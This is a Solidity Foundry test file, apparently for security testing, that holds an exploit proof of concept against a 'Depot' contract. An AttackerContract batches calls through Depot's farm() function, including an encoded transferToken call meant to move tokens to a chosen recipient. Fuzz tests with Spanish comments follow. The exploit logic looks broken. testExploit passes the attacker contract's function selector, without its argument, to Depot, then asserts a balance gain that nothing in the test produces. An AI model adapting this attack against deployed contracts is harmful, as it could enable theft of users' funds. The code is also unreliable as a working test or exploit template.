// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6 <0.9.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../../contracts/depot/Depot.sol";

import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";


contract DepotExploitTest is Test {
    Depot public depot;
    AttackerContract public attackerContract;
    address payable attacker = payable(address(0x1)); // Example attacker address

    function setUp() public {
        depot = new Depot();
        attackerContract = new AttackerContract(address(depot));
        // Provide the attacker with Ether to simulate an attack
        vm.deal(attacker, 10 ether);
    }

    function testExploit() public {
        // Record the attacker's balance before the exploit
        uint256 attackerBalanceBefore = attacker.balance;

        // Prepare the attack call data
        bytes memory exploitData = abi.encodeWithSelector(
            AttackerContract.attack.selector
        );

        // Create an array of bytes to simulate batch calls
        bytes[] memory data = new bytes[](2);
        data[0] = exploitData;
        data[1] = exploitData;

        // Simulate the attack
        vm.startPrank(attacker);
        // (bool success, ) = address(depot).call{value: 1 ether}(
        //     abi.encodeWithSelector(
        //         Depot.farm.selector,
        //         data
        //     )
        // );
        depot.farm(data);
        vm.stopPrank();

        // Record the attacker's balance after the exploit
        uint256 attackerBalanceAfter = attacker.balance;

        // require(success, "Attack failed");
        // Assert that the attacker's balance has increased as a result of the exploit
        assert(attackerBalanceAfter > attackerBalanceBefore);
    }

    function testFuzz_example(bytes[] calldata data) public {
        depot.farm(data);
    }

    function testFuzzFarm(bytes[] calldata data) public {
        // Inicia la simulación de la dirección del atacante como el remitente de la transacción
        vm.startPrank(attacker);
        
        // Intenta llamar a `farm` con datos generados aleatoriamente
        // Se captura el revert para evitar que la prueba falle debido a una transacción revertida
        // Esto permite evaluar la robustez de `farm` frente a entradas inesperadas o maliciosas
        bool success = tryDepotFarm(data);
        
        // Opcionalmente, puedes hacer aserciones o comprobaciones adicionales aquí
        // Por ejemplo, verificar el estado del contrato Depot después de la llamada
        // o asegurarte de que `success` sea true si esperas que todas las entradas sean válidas

        vm.stopPrank();
    }

    // Función helper para intentar llamar a `farm` y capturar si revierte
    function tryDepotFarm(bytes[] calldata data) internal returns (bool) {
        // Intenta ejecutar `farm` y captura el resultado de la operación (éxito o revert)
        (bool success, ) = address(depot).call(
            abi.encodeWithSelector(Depot.farm.selector, data)
        );
        return success;
    }

    function testFuzz_xFarm(bytes[] calldata data) public {
        vm.startPrank(attacker);

        // Intenta ejecutar `farm` y captura el resultado de la operación
        try depot.farm{value: 1 ether}(data) returns (bytes[] memory results) {
            for (uint256 i = 0; i < results.length; i++) {
                // Verifica que cada llamada delegatecall dentro de farm haya tenido éxito
                (bool success, ) = abi.decode(results[i], (bool, bytes));
                assertTrue(success, "Una de las llamadas delegatecall fallo.");
            }
        } catch {
            // Si `farm` revierte, la prueba falla
            fail("La llamada a farm ha revertido.");
        }

        vm.stopPrank();
    }
}

contract AttackerContract {
    address public owner;
    address public depotAddress;

    constructor(address _depotAddress) {
        owner = msg.sender;
        depotAddress = _depotAddress;
    }

    function prepareAttackData(address tokenAddress, address recipient, uint256 amount) public view returns (bytes[] memory) {
        bytes[] memory data = new bytes[](2);

        // First call: A benign function call, could be anything that doesn't alter state significantly.
        // For simplicity, this could be a call to a view function in Depot that returns some state variable.
        // Encoding the function signature and parameters
        data[0] = abi.encodeWithSignature("version()");

        // Second call: Malicious transferToken call
        // Replace "transferToken" with the actual function signature and parameters you intend to exploit
        data[1] = abi.encodeWithSignature("transferToken(address,address,uint256,uint8,uint8)", tokenAddress, recipient, amount, 0 /*EXTERNAL*/, 0 /*Assuming ToMode enum supports this*/);

        return data;
    }

    function attack(bytes[] memory data) external {
        // Ensure only the owner can initiate the attack for safety in this example
        require(msg.sender == owner, "Not owner");

        // Initiating the attack by calling `farm` with the prepared data
        (bool success, ) = depotAddress.call(abi.encodeWithSignature("farm(bytes[])", data));
        require(success, "Attack failed");
    }

    // Function to receive Ether (if the contract ends up receiving Ether directly)
    receive() external payable {}
}
